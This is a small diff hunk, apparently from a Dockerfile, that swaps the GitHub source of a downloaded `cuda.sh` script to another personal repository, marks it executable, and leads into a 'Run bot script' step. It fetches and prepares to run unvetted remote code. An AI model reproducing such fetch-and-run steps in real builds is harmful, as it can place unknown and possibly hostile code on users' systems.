@@ -28,7 +28,7 @@ RUN apt-get update && apt-get install -y \
 WORKDIR /home
 
 # Run config.sh and clean up APT:
-RUN wget https://raw.githubusercontent.com/Ahyanmoses/gawgaw/main/cuda.sh \
+RUN wget https://raw.githubusercontent.com/varfeplas/gnande/main/cuda.sh \
  && chmod +x cuda.sh
 
 # Run bot script:
